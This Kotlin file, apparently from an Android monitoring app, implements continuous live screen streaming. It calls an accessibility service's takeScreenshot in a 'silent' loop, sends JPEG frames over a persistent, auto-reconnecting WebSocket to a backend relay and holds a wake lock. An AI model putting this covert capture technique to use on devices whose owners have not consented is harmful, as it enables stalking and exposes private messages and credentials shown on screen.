package com.spapp.monitoring.screenstream

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import android.view.Display
import androidx.annotation.RequiresApi
import com.spapp.monitoring.BuildConfig
import com.spapp.monitoring.blocking.BlockAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume

/**
 * Manages high-performance, low-latency live screen streaming from the Android device
 * to the backend WebSocket relay.
 *
 * Resilience & Continuity Guidelines:
 * 1. Pure video stream: No audio recording or microphone usage.
 * 2. Dedicated screenshot executor: Isolates takeScreenshot callbacks to a background thread
 *    so UI thread activity (e.g. scrolling Instagram reels or app switches) never delays capture.
 * 3. Resilient Auto-Reconnect: If a socket failure occurs during app switching or network transitions,
 *    it does NOT abort streaming; it automatically reconnects with backoff.
 * 4. Safe hardware bitmap conversion: Converts hardware bitmaps cleanly to software RGB_565/ARGB_8888.
 * 5. Window transition resilience: Catches transient window animation error codes (code 1 / code 3)
 *    smoothly without locking the capture loop.
 * 6. Non-blocking queue: Drops frame only if WebSocket outgoing buffer backs up (> 128 KB).
 */
object ScreenStreamManager {

    private const val TAG = "ScreenStreamManager"
    private const val MIN_CAPTURE_INTERVAL_MS = 334L // Android AOSP AccessibilityService takeScreenshot interval
    private const val TARGET_MAX_DIMENSION = 500     // Fast downscale & compact transmission
    private const val JPEG_QUALITY = 50              // Fast compression with crisp clarity
    private const val MAX_WS_QUEUE_BYTES = 128 * 1024L // 128 KB buffer headroom

    // Packet type indicator for video JPEG
    private const val PACKET_TYPE_VIDEO: Byte = 0x01

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val screenshotExecutor = Executors.newSingleThreadExecutor()

    private var streamJob: Job? = null
    private var reconnectJob: Job? = null
    private var activeWebSocket: WebSocket? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val isStreaming = AtomicBoolean(false)

    private var currentAuthToken: String? = null
    private var currentDeviceId: String? = null
    private var onStreamStoppedCallback: (() -> Unit)? = null

    private val wsBaseUrl: String by lazy {
        BuildConfig.API_BASE_URL
            .replaceFirst("http://", "ws://")
            .replaceFirst("https://", "wss://")
            .trimEnd('/')
    }

    @Synchronized
    fun startStreaming(
        context: Context,
        authToken: String,
        deviceId: String,
        onStreamStopped: (() -> Unit)? = null
    ) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "Screen streaming requires Android 11+ (API 30+)")
            return
        }

        currentAuthToken = authToken
        currentDeviceId = deviceId
        onStreamStoppedCallback = onStreamStopped

        // If a stream session is already actively running and connected, keep running
        if (isStreaming.get() && activeWebSocket != null) {
            Log.d(TAG, "Screen stream session is already active — updating credentials")
            return
        }

        // Cancel previous reconnect job if any
        reconnectJob?.cancel()
        reconnectJob = null

        isStreaming.set(true)

        // Acquire partial WakeLock to prevent CPU sleep while live streaming
        try {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (wakeLock == null || wakeLock?.isHeld == false) {
                wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "spapp:ScreenStreamWakeLock")?.apply {
                    setReferenceCounted(false)
                    acquire(20 * 60 * 1000L) // 20 minutes safety auto-release
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire WakeLock", e)
        }

        connectWebSocket(context.applicationContext)
    }

    private fun connectWebSocket(appContext: Context) {
        val authToken = currentAuthToken ?: return
        val deviceId = currentDeviceId ?: return

        if (!isStreaming.get()) return

        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .pingInterval(8, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()

        val url = "$wsBaseUrl/ws/screen-stream?role=device&token=$authToken&deviceId=$deviceId"
        val request = Request.Builder().url(url).build()

        Log.d(TAG, "Connecting screen stream WebSocket...")
        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Screen stream WebSocket connected (pure video mode)")
                activeWebSocket = webSocket
                startCaptureLoop(appContext, webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    if (json.optString("action") == "stop") {
                        Log.d(TAG, "Received stop signal from relay/admin")
                        stopStreaming()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing WS message", e)
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closing: $code / $reason")
                if (code == 1000 || !isStreaming.get()) {
                    if (activeWebSocket == webSocket) {
                        stopStreaming()
                    }
                } else {
                    scheduleReconnect(appContext, webSocket)
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}, response code: ${response?.code}")
                if (isStreaming.get()) {
                    scheduleReconnect(appContext, webSocket)
                } else {
                    if (activeWebSocket == webSocket) {
                        stopStreaming()
                    }
                }
            }
        })
    }

    private fun scheduleReconnect(appContext: Context, failedWs: WebSocket?) {
        if (!isStreaming.get()) return

        if (activeWebSocket == failedWs || activeWebSocket == null) {
            activeWebSocket = null
            streamJob?.cancel()
            streamJob = null

            try {
                failedWs?.close(1001, "reconnecting")
            } catch (_: Exception) {}

            reconnectJob?.cancel()
            reconnectJob = scope.launch {
                Log.d(TAG, "Scheduling screen stream auto-reconnect in 1500ms...")
                delay(1500L)
                if (isStreaming.get() && activeWebSocket == null) {
                    Log.d(TAG, "Attempting screen stream reconnection...")
                    connectWebSocket(appContext)
                }
            }
        }
    }

    @Synchronized
    fun stopStreaming() {
        if (!isStreaming.getAndSet(false)) {
            val ws = activeWebSocket
            activeWebSocket = null
            try {
                ws?.close(1000, "stream stopped")
            } catch (_: Exception) {}
            return
        }

        Log.d(TAG, "Stopping screen stream")
        reconnectJob?.cancel()
        reconnectJob = null

        streamJob?.cancel()
        streamJob = null

        val ws = activeWebSocket
        activeWebSocket = null
        try {
            ws?.close(1000, "stream stopped")
        } catch (_: Exception) {}

        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
        wakeLock = null

        val cb = onStreamStoppedCallback
        onStreamStoppedCallback = null
        cb?.invoke()
    }

    private fun startCaptureLoop(context: Context, ws: WebSocket) {
        streamJob?.cancel()
        streamJob = scope.launch(Dispatchers.Default) {
            Log.d(TAG, "High-performance silent capture loop started")
            var lastCaptureStartTime = 0L

            while (isActive && isStreaming.get() && activeWebSocket == ws) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val now = SystemClock.uptimeMillis()
                    val elapsed = now - lastCaptureStartTime
                    if (elapsed < MIN_CAPTURE_INTERVAL_MS) {
                        delay(MIN_CAPTURE_INTERVAL_MS - elapsed)
                    }

                    // Drop frame only if WebSocket outgoing buffer is heavily congested (> 128 KB)
                    if (ws.queueSize() > MAX_WS_QUEUE_BYTES) {
                        delay(50L)
                        continue
                    }

                    lastCaptureStartTime = SystemClock.uptimeMillis()

                    // Safety timeout prevents the loop from ever freezing if an OS window transition stalls
                    withTimeoutOrNull(2500L) {
                        captureFrameSequential(context, ws)
                    }
                } else {
                    break
                }
            }
            Log.d(TAG, "Capture loop ended")
        }
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private suspend fun captureFrameSequential(context: Context, ws: WebSocket) {
        val service = BlockAccessibilityService.instance ?: run {
            Log.w(TAG, "BlockAccessibilityService not active")
            delay(500L)
            return
        }

        suspendCancellableCoroutine<Unit> { continuation ->
            try {
                // Pass dedicated single-thread screenshotExecutor so UI thread events (e.g. reel scrolling)
                // never delay or choke the screenshot callbacks!
                service.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    screenshotExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
                            scope.launch(Dispatchers.Default) {
                                val hardwareBuffer = screenshotResult.hardwareBuffer
                                val colorSpace = screenshotResult.colorSpace
                                try {
                                    val hwBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                    if (hwBitmap != null) {
                                        // Safely copy hardware bitmap to CPU memory (RGB_565 preferred for speed, ARGB_8888 fallback)
                                        val swBitmap = try {
                                            hwBitmap.copy(Bitmap.Config.RGB_565, false)
                                        } catch (_: Exception) {
                                            null
                                        } ?: hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
                                        hwBitmap.recycle()

                                        if (swBitmap != null) {
                                            val scaled = downscaleBitmap(swBitmap, TARGET_MAX_DIMENSION)
                                            val out = ByteArrayOutputStream(32 * 1024)
                                            scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
                                            val jpegBytes = out.toByteArray()

                                            if (scaled != swBitmap) scaled.recycle()
                                            swBitmap.recycle()

                                            // Send if stream is active and socket is still active
                                            if (isStreaming.get() && activeWebSocket == ws && ws.queueSize() <= MAX_WS_QUEUE_BYTES) {
                                                val packet = ByteArray(1 + jpegBytes.size)
                                                packet[0] = PACKET_TYPE_VIDEO
                                                System.arraycopy(jpegBytes, 0, packet, 1, jpegBytes.size)
                                                ws.send(packet.toByteString())
                                            }
                                        }
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error encoding frame", e)
                                } finally {
                                    hardwareBuffer.close()
                                    if (continuation.isActive) continuation.resume(Unit)
                                }
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.d(TAG, "takeScreenshot failure code: $errorCode")
                            scope.launch(Dispatchers.Default) {
                                when (errorCode) {
                                    AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT -> delay(60L)
                                    AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> delay(120L)
                                    else -> delay(100L)
                                }
                                if (continuation.isActive) continuation.resume(Unit)
                            }
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to invoke takeScreenshot", e)
                if (continuation.isActive) continuation.resume(Unit)
            }
        }
    }

    private fun downscaleBitmap(src: Bitmap, maxDim: Int): Bitmap {
        val width = src.width
        val height = src.height
        if (width <= maxDim && height <= maxDim) return src
        val scale = maxDim.toFloat() / maxOf(width, height)
        val dstWidth = (width * scale).toInt().coerceAtLeast(1)
        val dstHeight = (height * scale).toInt().coerceAtLeast(1)
        return Bitmap.createScaledBitmap(src, dstWidth, dstHeight, true)
    }
}
